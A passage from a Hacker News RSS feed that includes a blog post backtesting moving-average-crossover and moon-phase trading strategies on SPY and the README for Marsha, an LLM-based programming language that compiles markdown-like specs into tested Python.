jI3LTEuMDYuMjctLjg3IDAtMS41Ni0uMzItMi4wNy0uOTVzLS43Ni0xLjUxLS43Ni0yLjY1em0xLjY3LS4wMWMwIC43NC4xMyAxLjMxLjQgMS43LjI2LjM4LjY1LjU4IDEuMTUuNTguNTEgMCAuOTktLjI2IDEuNDQtLjc3di0zLjIxYy0uMjQtLjIxLS40OC0uMzYtLjctLjQ1LS4yMy0uMDgtLjQ2LS4xMi0uNy0uMTItLjQ1IDAtLjgyLjE5LTEuMTMuNTktLjMxLjM5LS40Ni45NS0uNDYgMS42OHptNi4zNSAxLjU5YzAtLjczLjMyLTEuMy45Ny0xLjcxLjY0LS40IDEuNjctLjY4IDMuMDgtLjg0IDAtLjE3LS4wMi0uMzQtLjA3LS41MS0uMDUtLjE2LS4xMi0uMy0uMjItLjQzcy0uMjItLjIyLS4zOC0uM2MtLjE1LS4wNi0uMzQtLjEtLjU4LS4xLS4zNCAwLS42OC4wNy0xIC4ycy0uNjMuMjktLjkzLjQ3bC0uNTktMS4wOGMuMzktLjI0LjgxLS40NSAxLjI4LS42My40Ny0uMTcuOTktLjI2IDEuNTQtLjI2Ljg2IDAgMS41MS4yNSAxLjkzLjc2cy42MyAxLjI1LjYzIDIuMjF2NC4wN2gtMS4zMmwtLjEyLS43NmgtLjA1Yy0uMy4yNy0uNjMuNDgtLjk4LjY2cy0uNzMuMjctMS4xNC4yN2MtLjYxIDAtMS4xLS4xOS0xLjQ4LS41Ni0uMzgtLjM2LS41Ny0uODUtLjU3LTEuNDZ6bTEuNTctLjEyYzAgLjMuMDkuNTMuMjcuNjcuMTkuMTQuNDIuMjEuNzEuMjEuMjggMCAuNTQtLjA3Ljc3LS4ycy40OC0uMzEuNzMtLjU2di0xLjU0Yy0uNDcuMDYtLjg2LjEzLTEuMTguMjMtLjMxLjA5LS41Ny4xOS0uNzYuMzFzLS4zMy4yNS0uNDEuNGMtLjA5LjE1LS4xMy4zMS0uMTMuNDh6bTYuMjktMy42M2gtLjk4di0xLjJsMS4wNi0uMDcuMi0xLjg4aDEuMzR2MS44OGgxLjc1djEuMjdoLTEuNzV2My4yOGMwIC44LjMyIDEuMi45NyAxLjIuMTIgMCAuMjQtLjAxLjM3LS4wNC4xMi0uMDMuMjQtLjA3LjM0LS4xMWwuMjggMS4xOWMtLjE5LjA2LS40LjEyLS42NC4xNy0uMjMuMDUtLjQ5LjA4LS43Ni4wOC0uNCAwLS43NC0uMDYtMS4wMi0uMTgtLjI3LS4xMy0uNDktLjMtLjY3LS41Mi0uMTctLjIxLS4zLS40OC0uMzctLjc4LS4wOC0uMy0uMTItLjY0LS4xMi0xLjAxem00LjM2IDIuMTdjMC0uNTYuMDktMS4wNi4yNy0xLjUxcy40MS0uODMuNzEtMS4xNGMuMjktLjMuNjMtLjU0IDEuMDEtLjcxLjM5LS4xNy43OC0uMjUgMS4xOC0uMjUuNDcgMCAuODguMDggMS4yMy4yNC4zNi4xNi42NS4zOC44OS42N3MuNDIuNjMuNTQgMS4wM2MuMTIuNDEuMTguODQuMTggMS4zMiAwIC4zMi0uMDIuNTctLjA3Ljc2aC00LjM3Yy4wOC42Mi4yOSAxLjEuNjUgMS40NC4zNi4zMy44Mi41IDEuMzguNS4zIDAgLjU4LS4wNC44NC0uMTMuMjUtLjA5LjUxLS4yMS43Ni0uMzdsLjU0IDEuMDFjLS4zMi4yMS0uNjkuMzktMS4wOS41M3MtLjgyLjIxLTEuMjYuMjFjLS40NyAwLS45Mi0uMDgtMS4zMy0uMjUtLjQxLS4xNi0uNzctLjQtMS4wOC0uNy0uMy0uMzEtLjU0LS42OS0uNzItMS4xMy0uMTctLjQ0LS4yNi0uOTUtLjI2LTEuNTJ6bTQuNjEtLjYyYzAtLjU1LS4xMS0uOTgtLjM0LTEuMjgtLjIzLS4zMS0uNTgtLjQ3LTEuMDYtLjQ3LS40MSAwLS43Ny4xNS0xLjA4LjQ1LS4zMS4yOS0uNS43My0uNTcgMS4zem0zLjAxIDIuMjNjLjMxLjI0LjYxLjQzLjkyLjU3LjMuMTMuNjMuMi45OC4yLjM4IDAgLjY1LS4wOC44My0uMjNzLjI3LS4zNS4yNy0uNmMwLS4xNC0uMDUtLjI2LS4xMy0uMzctLjA4LS4xLS4yLS4yLS4zNC0uMjgtLjE0LS4wOS0uMjktLjE2LS40Ny0uMjNsLS41My0uMjJjLS4yMy0uMDktLjQ2LS4xOC0uNjktLjMtLjIzLS4xMS0uNDQtLjI0LS42Mi0uNHMtLjMzLS4zNS0uNDUtLjU1Yy0uMTItLjIxLS4xOC0uNDYtLjE4LS43NSAwLS42MS4yMy0xLjEuNjgtMS40OS40NC0uMzggMS4wNi0uNTcgMS44My0uNTcuNDggMCAuOTEuMDggMS4yOS4yNXMuNzEuMzYuOTkuNTdsLS43NC45OGMtLjI0LS4xNy0uNDktLjMyLS43My0uNDItLjI1LS4xMS0uNTEtLjE2LS43OC0uMTYtLjM1IDAtLjYuMDctLjc2LjIxLS4xNy4xNS0uMjUuMzMtLjI1LjU0IDAgLjE0LjA0LjI2LjEyLjM2cy4xOC4xOC4zMS4yNmMuMTQuMDcuMjkuMTQuNDYuMjFsLjU0LjE5Yy4yMy4wOS40Ny4xOC43LjI5cy40NC4yNC42NC40Yy4xOS4xNi4zNC4zNS40Ni41OC4xMS4yMy4xNy41LjE3LjgyIDAgLjMtLjA2LjU4LS4xNy44My0uMTIuMjYtLjI5LjQ4LS41MS42OC0uMjMuMTktLjUxLjM0LS44NC40NS0uMzQuMTEtLjcyLjE3LTEuMTUuMTctLjQ4IDAtLjk1LS4wOS0xLjQxLS4yNy0uNDYtLjE5LS44Ni0uNDEtMS4yLS42OHoiIGZpbGw9IiM1MzUzNTMiLz48L2c+PC9zdmc+"></a></p><div><h3 id="citeas">Cite this article</h3><p>Ditlevsen, P., Ditlevsen, S. Warning of a forthcoming collapse of the Atlantic meridional overturning circulation.
                    <i>Nat Commun</i> <b>14</b>, 4254 (2023). https://doi.org/10.1038/s41467-023-39810-w</p><p><a data-test="citation-link" data-track="click" data-track-action="download article citation" data-track-label="link" data-track-external="" rel="nofollow" href="https://citation-needed.springer.com/v2/references/10.1038/s41467-023-39810-w?format=refman&amp;flavour=citation">Download citation</a></p><ul data-test="publication-history"><li><p>Received<span>: </span><span><time datetime="2023-03-03">03 March 2023</time></span></p></li><li><p>Accepted<span>: </span><span><time datetime="2023-06-29">29 June 2023</time></span></p></li><li><p>Published<span>: </span><span><time datetime="2023-07-25">25 July 2023</time></span></p></li><li><p><abbr title="Digital Object Identifier">DOI</abbr><span>: </span><span>https://doi.org/10.1038/s41467-023-39810-w</span></p></li></ul></div></div></div>
            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Is technical analysis just stock market astrology? (324 pts)]]></title>
            <link>https://alicegg.tech//2023/07/25/technical-analysis.html</link>
            <guid>36864115</guid>
            <pubDate>Tue, 25 Jul 2023 15:49:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://alicegg.tech//2023/07/25/technical-analysis.html">https://alicegg.tech//2023/07/25/technical-analysis.html</a>, See on <a href="https://news.ycombinator.com/item?id=36864115">Hacker News</a></p>
<div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
	<div itemprop="articleBody">
		<p>Technical analysis is a part of finance that studies price moves to guide investment decisions.
A lot of investors seem skeptical of the use of past price data, which leads to technical analysis often being perceived as similar to astrology.
In this article, I will try to see if it can provide an edge to long-term investors and if it beats reading the horoscope.</p>

<figure>
	<img src="https://alicegg.tech/assets/2023-07-25-technical-analysis/screen.jpg" alt="A screen showing multiple stock prices" width="100%">
	<figcaption>
		Photo by <a href="https://unsplash.com/@chrisliverani?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Chris Liverani</a>
	</figcaption>
</figure>

<h2 id="moving-average-crossover">Moving Average Crossover</h2>

<p>There are hundreds of different technical analysis strategies and indicators out there.
For this article, I decided to pick what seemed to be one of the simplest: SMA crossovers.</p>

<p>Simple Moving Averages (SMA) are, as the name suggests, just an average of past closing prices.
The SMA Crossover strategy uses two moving averages, a ‚Äúfast‚Äù one (50 days) and a ‚Äúslow‚Äù one (200 days), and compares them to decide on buying or selling an asset.
If the fast SMA is above the slow one, we should buy and hold the stock, and if this condition inverts, we should sell.
It is a heuristic around <a href="https://en.wikipedia.org/wiki/Momentum_(finance)">momentum</a>, which is the idea that if an asset price starts rising, we can jump on the bandwagon and hope it will continue its trajectory.</p>

<figure>
	<img src="https://alicegg.tech/assets/2023-07-25-technical-analysis/sma_illu.jpg" alt="The strategy would have for example indicated to buy and hold between June 2009 and June 2010" width="100%">
</figure>

<p>I have backtested an SMA crossover strategy on the <a href="https://www.ssga.com/us/en/intermediary/etfs/funds/spdr-sp-500-etf-trust-spy">SPY ETF</a>, one of the most traded passive investment funds in the world.
My backtest makes the following assumptions:</p>
<ul>
  <li>we do not pay any transaction fees</li>
  <li>we will obtain exactly the close price when buying or selling</li>
  <li>dividends received while holding stocks are immediately reinvested</li>
  <li>cash yields no interests</li>
</ul>

<figure>
	<img src="https://alicegg.tech/assets/2023-07-25-technical-analysis/sma.jpg" alt="The result of both backtests, showing similar performance for the SMA and buy and hold strategies" width="100%">
</figure>

<p>While someone who would have bought 10.000$ of SPY in July 1998 and continuously held the stock would have ended up with 52.030$ in June 2023 (6.78% annualized),
an investor using the SMA crossover strategy would have made ended up with 49.127$. (6.54%).
Even without accounting for transaction costs, the SMA crossover strategy doesn‚Äôt provide a significant over-performance to simply buying and holding over a long period.</p>

<p>Does this mean that this strategy is completely useless?</p>

<p>Actually no, a closer look at the data will show that the SMA crossover strategy allows investors to avoid extended drawdowns, like the 2008 crisis.
This significantly reduces the risk taken by investors: the yearly standard deviation of the SMA crossover strategy is only 13%, against 19% for the buy and hold strategy.
Since returns didn‚Äôt decrease as much as risk, this leads to high risk-adjusted returns, as measured by the <a href="https://en.wikipedia.org/wiki/Sharpe_ratio">Sharpe ratio</a>: 0.43 for passive investing vs 0.53 for SMA crossovers.</p>

<h2 id="but-what-about-astrology">But what about astrology?</h2>

<p>Of course, the subject of this article wasn‚Äôt to compare technical analysis to buy and hold, but to astrology.
I was surprised to learn that <a href="https://en.wikipedia.org/wiki/Financial_astrology">financial astrology</a> was actually a thing and that there were also a lot of astrology-related strategies out there.
I decided to implement a strategy based on <a href="https://www.oreilly.com/library/view/timing-solutions-for/9781118339206/xhtml/sec64.html">lunar cycles</a> since it was one of the clearest about when to buy and when to sell.</p>

<p>The strategy goes as follows: we purchase SPY on a new moon, and re-sell it on the next full moon.
And repeat that every lunar month.</p>

<figure>
	<img src="https://alicegg.tech/assets/2023-07-25-technical-analysis/moon.jpg" alt="The result of both backtests, showing the moon phases strategy failing to make any money" width="100%">
</figure>

<p>Clearly, it fails at beating SMA crossovers.
Or at doing basically anything, an investor using the moon phase strategy starting with 10.000$ would end up with only 11.110$ and a Sharpe ratio of only 0.09.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Similarly to <a href="https://alicegg.tech/2023/03/09/shannon-demon.html">diversification</a>, simple technical analysis strategies can be used to minimize investment risk, without necessarily reducing profits by the same amount.
There‚Äôs however no guarantee that a strategy that worked in the past will continue working in the future.
It is also likely that there exist smarter momentum indicators than moving averages, but you‚Äôll have to do your own backtests for those.</p>

	</div>
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Marsha ‚Äì An LLM-Based Programming Language (119 pts)]]></title>
            <link>https://github.com/alantech/marsha</link>
            <guid>36864021</guid>
            <pubDate>Tue, 25 Jul 2023 15:43:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/alantech/marsha">https://github.com/alantech/marsha</a>, See on <a href="https://news.ycombinator.com/item?id=36864021">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">Marsha AI Language</h2>
<p dir="auto"><a href="https://discord.gg/p5BTaWAdjm" rel="nofollow"><img src="https://camo.githubusercontent.com/c9c9862f7325657b45a2c2f19342d2f2a2b7927486a5d7bc361ed35b1fe592c9/68747470733a2f2f646362616467652e76657263656c2e6170702f6170692f7365727665722f70354254615741646a6d3f7374796c653d666c6174" alt="Discord Follow" data-canonical-src="https://dcbadge.vercel.app/api/server/p5BTaWAdjm?style=flat"></a>
<a href="https://github.com/alantech/marsha"><img src="https://camo.githubusercontent.com/1b3fbf858b180c07b332df5afd512091b84ab164ef545ca13e21be60b305a54a/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f616c616e746563682f6d61727368613f7374796c653d736f6369616c" alt="GitHub Repo Stars" data-canonical-src="https://img.shields.io/github/stars/alantech/marsha?style=social"></a></p>
<div dir="auto"><p><b>Describe Logic ‚¥≤ Provide Examples ‚¥≤ Run Reliably</b></p><p><a target="_blank" rel="noopener noreferrer" href="https://github.com/alantech/marsha/blob/main/examples/images/duckduckgo-terminal.gif"><img src="https://github.com/alantech/marsha/raw/main/examples/images/duckduckgo-terminal.gif" data-animated-image=""></a></p></div>
<p dir="auto">Marsha is an LLM-based programming language. Describe what you want done with a simple syntax, provide examples of usage, and the Marsha compiler will guide an LLM to produce tested Python software.</p>
<h2 tabindex="-1" dir="auto">Usage</h2>
<p dir="auto">The Marsha compiler can be used to compile the syntax using a <code>pip</code> module via a terminal or Jupyter Notebook:</p>
<div dir="auto" data-snippet-clipboard-copy-content="pip install git+https://github.com/alantech/marsha
python -m marsha data_mangling.mrsh"><pre>pip install git+https://github.com/alantech/marsha
python -m marsha data_mangling.mrsh</pre></div>
<h2 tabindex="-1" dir="auto">Syntax</h2>
<p dir="auto">The Marsha syntax looks a lot like markdown and is a mixture of English and mathematical notation. It has its own file format <code>.mrsh</code> that houses function definition(s). The syntax is subject to change as Marsha is currently in an alpha state. If you have a legitimate use case for Marsha, please let us know.</p>
<h3 tabindex="-1" dir="auto">Data Types</h3>
<p dir="auto">Data types provide function type safety which helps improve the accuracy of the code generation. The data type format is almost identical to the CSV format.</p>
<div dir="auto" data-snippet-clipboard-copy-content="# type EmployeeSkills
name, skill
Bob,	math
Jake,	spreadsheets
Lisa,	coding
Sue,	spreadsheets"><pre><span># <span>type EmployeeSkills</span></span>
name, skill
Bob,	math
Jake,	spreadsheets
Lisa,	coding
Sue,	spreadsheets</pre></div>
<p dir="auto">It is also possible for Marsha to infer the data type from CSV file</p>
<div dir="auto" data-snippet-clipboard-copy-content="# type EmployeesByDepartment employees_by_department.csv"><pre><span># <span>type EmployeesByDepartment employees_by_department.csv</span></span></pre></div>
<h3 tabindex="-1" dir="auto">Functions</h3>
<p dir="auto">Functions are the bread and butter of Marsha and can easily define transformations between different data types. There are three sections to a Marsha function: the declaration, the description, and the examples.</p>
<p dir="auto">The declaration is a Markdown heading section prefixed with <code>func</code>, then followed by a name, parenthesis containing the input type(s), and finally a colon followed by the output type. The name must be a single word, but the types don't need to be classic software types, or even the explicit data types defined above. They can themselves be simple descriptions of what the type is meant to be. Eg,</p>
<div dir="auto" data-snippet-clipboard-copy-content="# func get_employee_skills(list of EmployeesByDepartment, list of DepartmentSkills): list of EmployeeSkills"><pre><span># <span>func get_employee_skills(list of EmployeesByDepartment, list of DepartmentSkills): list of EmployeeSkills</span></span></pre></div>
<p dir="auto">The next section is the description of the function. Here you explain what the function should do. Being more explicit here will reduce variability in the generated output and improve reliability in behavior, but it's up to you just how explicit you will be and how much you leave to the LLM to figure out. This is similar to declarative languages like SQL and HTML where there are defaults for things you do not specify, like the sort order of <code>select</code> statements or the default styling of a <code>&lt;div&gt;</code>. Eg,</p>
<div dir="auto" data-snippet-clipboard-copy-content="This function receives a list of EmployeesByDepartment and a list of DepartmentSkills. The function should be able to create a response of EmployeeSkills merging the 2 list by department. Use the pandas library."><pre>This function receives a list of EmployeesByDepartment and a list of DepartmentSkills. The function should be able to create a response of EmployeeSkills merging the 2 list by department. Use the pandas library.</pre></div>
<p dir="auto">The final section is the example section. Here you provide examples of calling the function and what its output should be. Marsha uses this to provide more information to the LLM to generate the logic you want, but also uses it to generate a test suite to validate that what it has generated actually does what you want it to. This feedback loop makes Marsha more reliable than directly using the LLM itself. In some ways, this is similar to Constraint-based programming languages where you validate and verify the behavior of your function in the definition of the function itself, but it is also less stringent than those, allowing incomplete constraints where constraint-based languages will fail to compile in the face of that ambiguity. Eg,</p>
<div dir="auto" data-snippet-clipboard-copy-content="* get_employee_skills() = throws an error
* get_employee_skills([EmployeesByDepartment('Joe', 'Accounting')]) = throws an error
* get_employee_skills([], []) = []
* get_employee_skills([EmployeesByDepartment('Joe', 'Accounting')], []) = []
* get_employee_skills([], [DepartmentSkills('Accounting', 'math')]) = []
* get_employee_skills([EmployeesByDepartment('Joe', 'Accounting')], [DepartmentSkills('Accounting', 'math')]) = [EmployeeSkills('Joe', 'math')]
* get_employee_skills([EmployeesByDepartment('Joe', 'Accounting'), EmployeesByDepartment('Jake', 'Engineering')], [DepartmentSkills('Accounting', 'math')]) = [EmployeeSkills('Joe', 'math')]
* get_employee_skills([EmployeesByDepartment('Joe', 'Accounting'), EmployeesByDepartment('Jake', 'Engineering')], [DepartmentSkills('Accounting', 'math'), DepartmentSkills('Engineering', 'coding')]) = [EmployeeSkills('Joe', 'math'), EmployeeSkills('Jake', 'coding')]"><pre><span>*</span> get_employee_skills() = throws an error
<span>*</span> get_employee_skills(<span>[</span>EmployeesByDepartment('Joe', 'Accounting')<span>]</span>) = throws an error
<span>*</span> get_employee_skills(<span>[</span><span>]</span>, <span>[</span><span>]</span>) = <span>[</span><span>]</span>
<span>*</span> get_employee_skills(<span>[</span>EmployeesByDepartment('Joe', 'Accounting')<span>]</span>, <span>[</span><span>]</span>) = <span>[</span><span>]</span>
<span>*</span> get_employee_skills(<span>[</span><span>]</span>, <span>[</span>DepartmentSkills('Accounting', 'math')<span>]</span>) = <span>[</span><span>]</span>
<span>*</span> get_employee_skills(<span>[</span>EmployeesByDepartment('Joe', 'Accounting')<span>]</span>, <span>[</span>DepartmentSkills('Accounting', 'math')<span>]</span>) = <span>[</span>EmployeeSkills('Joe', 'math')<span>]</span>
<span>*</span> get_employee_skills(<span>[</span>EmployeesByDepartment('Joe', 'Accounting'), EmployeesByDepartment('Jake', 'Engineering')<span>]</span>, <span>[</span>DepartmentSkills('Accounting', 'math')<span>]</span>) = <span>[</span>EmployeeSkills('Joe', 'math')<span>]</span>
<span>*</span> get_employee_skills(<span>[</span>EmployeesByDepartment('Joe', 'Accounting'), EmployeesByDepartment('Jake', 'Engineering')<span>]</span>, <span>[</span>DepartmentSkills('Accounting', 'math'), DepartmentSkills('Engineering', 'coding')<span>]</span>) = <span>[</span>EmployeeSkills('Joe', 'math'), EmployeeSkills('Jake', 'coding')<span>]</span></pre></div>
<p dir="auto">Altogether this produces:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# func get_employee_skills(list of EmployeesByDepartment, list of DepartmentSkills): list of EmployeeSkills

This function receives a list of EmployeesByDepartment and a list of DepartmentSkills. The function should be able to create a response of EmployeeSkills merging the 2 list by department. Use the pandas library.

* get_employee_skills() = throws an error
* get_employee_skills([EmployeesByDepartment('Joe', 'Accounting')]) = throws an error
* get_employee_skills([], []) = []
* get_employee_skills([EmployeesByDepartment('Joe', 'Accounting')], []) = []
* get_employee_skills([], [DepartmentSkills('Accounting', 'math')]) = []
* get_employee_skills([EmployeesByDepartment('Joe', 'Accounting')], [DepartmentSkills('Accounting', 'math')]) = [EmployeeSkills('Joe', 'math')]
* get_employee_skills([EmployeesByDepartment('Joe', 'Accounting'), EmployeesByDepartment('Jake', 'Engineering')], [DepartmentSkills('Accounting', 'math')]) = [EmployeeSkills('Joe', 'math')]
* get_employee_skills([EmployeesByDepartment('Joe', 'Accounting'), EmployeesByDepartment('Jake', 'Engineering')], [DepartmentSkills('Accounting', 'math'), DepartmentSkills('Engineering', 'coding')]) = [EmployeeSkills('Joe', 'math'), EmployeeSkills('Jake', 'coding')]"><pre><span># <span>func get_employee_skills(list of EmployeesByDepartment, list of DepartmentSkills): list of EmployeeSkills</span></span>

This function receives a list of EmployeesByDepartment and a list of DepartmentSkills. The function should be able to create a response of EmployeeSkills merging the 2 list by department. Use the pandas library.

<span>*</span> get_employee_skills() = throws an error
<span>*</span> get_employee_skills(<span>[</span>EmployeesByDepartment('Joe', 'Accounting')<span>]</span>) = throws an error
<span>*</span> get_employee_skills(<span>[</span><span>]</span>, <span>[</span><span>]</span>) = <span>[</span><span>]</span>
<span>*</span> get_employee_skills(<span>[</span>EmployeesByDepartment('Joe', 'Accounting')<span>]</span>, <span>[</span><span>]</span>) = <span>[</span><span>]</span>
<span>*</span> get_employee_skills(<span>[</span><span>]</span>, <span>[</span>DepartmentSkills('Accounting', 'math')<span>]</span>) = <span>[</span><span>]</span>
<span>*</span> get_employee_skills(<span>[</span>EmployeesByDepartment('Joe', 'Accounting')<span>]</span>, <span>[</span>DepartmentSkills('Accounting', 'math')<span>]</span>) = <span>[</span>EmployeeSkills('Joe', 'math')<span>]</span>
<span>*</span> get_employee_skills(<span>[</span>EmployeesByDepartment('Joe', 'Accounting'), EmployeesByDepartment('Jake', 'Engineering')<span>]</span>, <span>[</span>DepartmentSkills('Accounting', 'math')<span>]</span>) = <span>[</span>EmployeeSkills('Joe', 'math')<span>]</span>
<span>*</span> get_employee_skills(<span>[</span>EmployeesByDepartment('Joe', 'Accounting'), EmployeesByDepartment('Jake', 'Engineering')<span>]</span>, <span>[</span>DepartmentSkills('Accounting', 'math'), DepartmentSkills('Engineering', 'coding')<span>]</span>) = <span>[</span>EmployeeSkills('Joe', 'math'), EmployeeSkills('Jake', 'coding')<span>]</span></pre></div>
<h3 tabindex="-1" dir="auto">Goals</h3>
<p dir="auto">The Marsha syntax is meant to be:</p>
<ul dir="auto">
<li>minimal and "obvious", but also discourage lax or incomplete information that could lead to unpredictable behavior</li>
<li>be mechanically parseable for syntax highlighting and quick feedback on correctness issues to the user</li>
<li>make it easy to define examples to reduce the probability of generating faulty code and allow generating tests that the application code can be tested against</li>
</ul>
<h2 tabindex="-1" dir="auto">Compiler</h2>
<p dir="auto">Marsha is compiled by an LLM into tested software that meets the requirements described, but implementation details can vary greatly across runs much like if different developers implemented it for you. There is typically more than one way to write software that fulfills a set of requirements. However, the compiler is best-effort and sometimes it will fail to generate the described program. We aim for 80%+ accuracy on our <a href="https://github.com/alantech/marsha/blob/main/examples">examples</a>. In general, the more detailed the description and the more examples are provided the more likely the output will work.</p>
<p dir="auto">In order to use the compiler, the following environment variables must be set:</p>
<ul dir="auto">
<li><code>OPENAI_ORG</code></li>
<li><code>OPENAI_SECRET_KEY</code></li>
</ul>
<p dir="auto">Support for other LLMs, including running something locally, is planned but not yet implemented.</p>
<p dir="auto">There are also a few flags on how to use Marsha:</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ marsha --help
usage: marsha [-h] [-d] [-q] [-a ATTEMPTS] [-n N_PARALLEL_EXECUTIONS] [--exclude-main-helper] [-s] source

Marsha AI Compiler

positional arguments:
  source

options:
  -h, --help            show this help message and exit
  -d, --debug           Turn on debug logging
  -q, --quick-and-dirty
                        Code generation with no correction stages run
  -a ATTEMPTS, --attempts ATTEMPTS
  -n N_PARALLEL_EXECUTIONS, --n-parallel-executions N_PARALLEL_EXECUTIONS
  --exclude-main-helper
                        Skips addition of helper code for running as a script
  -s, --stats           Save stats and write them to a file"><pre>$ marsha --help
usage: marsha [-h] [-d] [-q] [-a ATTEMPTS] [-n N_PARALLEL_EXECUTIONS] [--exclude-main-helper] [-s] <span>source</span>

Marsha AI Compiler

positional arguments:
  <span>source</span>

options:
  -h, --help            show this <span>help</span> message and <span>exit</span>
  -d, --debug           Turn on debug logging
  -q, --quick-and-dirty
                        Code generation with no correction stages run
  -a ATTEMPTS, --attempts ATTEMPTS
  -n N_PARALLEL_EXECUTIONS, --n-parallel-executions N_PARALLEL_EXECUTIONS
  --exclude-main-helper
                        Skips addition of helper code <span>for</span> running as a script
  -s, --stats           Save stats and write them to a file</pre></div>
<ul dir="auto">
<li><code>-d</code> adds a significant amount of debug information to the screen. Probably not useful if you're not working on Marsha itself.</li>
<li><code>-q</code> runs only the initial code generation phase without any of the corrective feedback stages. This is significantly cheaper, but more likely to generate code that doesn't quite work. This could be useful if you're using Marsha like Github Copilot or directly asking for code from ChatGPT, but with the Marsha syntax providing some more structure to produce a better result than you might if simply given a blank screen to write into.</li>
<li><code>-a</code> The number of times marsha should attempt to compile your program, defaulting to just once. If set to more than 1, on a failure it will try again. For some trickier programs this might improve the ability to get working code at the cost of more LLM calls.</li>
<li><code>-n</code> The number of parallel LLM threads of "thought" to pursue per attempt. This defaults to 3. When a path succeeds, all of the other paths are cancelled.</li>
<li><code>-s</code> Save the stats that are printed by default to a file, instead. Probably not useful if you're not working on Marsha itself.</li>
<li><code>--exclude-main-helper</code> Turns off the automatically generated code to make using your compiled Marsha code from the CLI easier, which is included by default.</li>
</ul>
<h2 tabindex="-1" dir="auto">Using compiled Marsha code</h2>
<p dir="auto">By default, Marsha appends logic to the generated Python code to make usage simpler, allowing you to invoke it from the CLI and potentially start a REST server.</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ python -m duckduckgo --help
usage: duckduckgo.py [-h] [-c {BeautifulSoup,duckduckgo}] [-j] [-t] [-i] [-f INFILE] [-o OUTFILE] [-s SERVE] [params ...]

Marsha-generated CLI options

positional arguments:
  params                Arguments to be provided to the function being run. Optimistically converted to simple python types by default, and left as strings if not possible

options:
  -h, --help            show this help message and exit
  -c {BeautifulSoup,duckduckgo}, --func {BeautifulSoup,duckduckgo}
                        Specifies the function to call. Defaults to the last defined function
  -j, --force-json      Forces arguments, files, or stdin to be parsed as JSON
  -t, --force-text      Forces arguments, files, or stdin to be parsed as raw text
  -i, --stdin           Ignores CLI parameters in favor of stdin (as a single parameter)
  -f INFILE, --infile INFILE
                        Ignores CLI parameters in favor of reading the specified file (as a single parameter)
  -o OUTFILE, --outfile OUTFILE
                        Saves the result to a file instead of stdout
  -s SERVE, --serve SERVE
                        Spins up a simple REST web server on the specified port. When used all other options are ignored"><pre>$ python -m duckduckgo --help
usage: duckduckgo.py [-h] [-c {BeautifulSoup,duckduckgo}] [-j] [-t] [-i] [-f INFILE] [-o OUTFILE] [-s SERVE] [params ...]

Marsha-generated CLI options

positional arguments:
  params                Arguments to be provided to the <span>function</span> <span>being</span> run. Optimistically converted to simple python types by default, and left as strings <span>if</span> not possible

options:
  -h, --help            show this <span>help</span> message and <span>exit</span>
  -c {BeautifulSoup,duckduckgo}, --func {BeautifulSoup,duckduckgo}
                        Specifies the <span>function</span> <span>to</span> call. Defaults to the last defined function
  -j, --force-json      Forces arguments, files, or stdin to be parsed as JSON
  -t, --force-text      Forces arguments, files, or stdin to be parsed as raw text
  -i, --stdin           Ignores CLI parameters <span>in</span> favor of stdin (as a single parameter)
  -f INFILE, --infile INFILE
                        Ignores CLI parameters <span>in</span> favor of reading the specified file (as a single parameter)
  -o OUTFILE, --outfile OUTFILE
                        Saves the result to a file instead of stdout
  -s SERVE, --serve SERVE
                        Spins up a simple REST web server on the specified port. When used all other options are ignored</pre></div>
<ul dir="auto">
<li><code>-c</code> Lets you choose which function within the generated code you wish to invoke. By default it selects the <em>last</em> function defined, as that is usually a "main-like" function.</li>
<li><code>params</code> are all non-option arguments provided, in order, to the function you are invoking.</li>
<li><code>-j</code> and <code>-t</code> let you choose if the param(s) provided will be parsed as JSON or kept as plain text. By default it will opportunistically parse the arguments but if it fails will keep it as text</li>
<li><code>-i</code>, <code>-f</code>, and <code>-o</code> let you choose how input and output is managed. By default inputs are the <code>params</code> arguments and the output is to <code>stdout</code>, but you can use <code>-i</code> to then ignore all <code>params</code> and treat <code>stdin</code> as the singular input param for your function. Similarly <code>-f</code> will do the same, but for the file you specify, and <code>-o</code> will write the result to a file you specify instead of to <code>stdout</code>.</li>
<li><code>-s</code> Is a flag to instead run a simple REST server. Using this flag causes it to ignore all other flags. The various function names become <code>/func_name</code> endpoints that you can POST to and get a response body back. If you set the <code>Content-Type</code> header to <code>application/json</code> the input and output will be JSON, if not it will be plain text. If your function takes mutliple arguments, it <em>must</em> be called in JSON mode with the arguments each being an element of a top-level array.</li>
</ul>
<h2 tabindex="-1" dir="auto">Roadmap</h2>
<ul dir="auto">
<li>Improve average accuracy for our test bed above 90%</li>
<li>Support for visualizations and data storage (geek mode: handle side-effect logic better in general)</li>
<li>Syntax highlighting (vim, vscode, etc)</li>
<li>Support for different types of LLM</li>
<li>Bootstrap the Marsha compiler with a Marsha program</li>
<li>More target languages other than Python</li>
<li>A module system</li>
<li>Edits to Marsha mutating existing Python code instead of regenerating</li>
<li>"Decompiler" from source code into Marsha syntax</li>
<li>"Debugger" meta mode to take existing Marsha definition and an example of an unexpected failure and recommend what to update with the Marsha definition.</li>
<li>Optmization "levels" (spend more time on more iterations with the LLM improving performance, security, etc)</li>
<li>Marsha GUI mode: visual editor baked into the compiler (eventually with the decompiler/debugger/etc features), and able to generate a GUI wrapper for generated code, enabling end-to-end non-terminal usage</li>
<li>Better support for a mixed environment (Marsha functions can be used by Python, but how to get Marsha to use hand-written Python functions)</li>
<li>Better "web scraping" behavior (LLM likes to assume the internet still looks like it did in November 2021, but HTML structure has often changed for the largest websites; automatically correcting that assumption would be nice)</li>
</ul>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Messaging Layer Security (MLS) Protocol (139 pts)]]></title>
            <link>https://datatracker.ietf.org/doc/html/rfc9420</link>
            <guid>36863915</guid>
            <pubDate>Tue, 25 Jul 2023 15:38:41 GMT</pubDate>
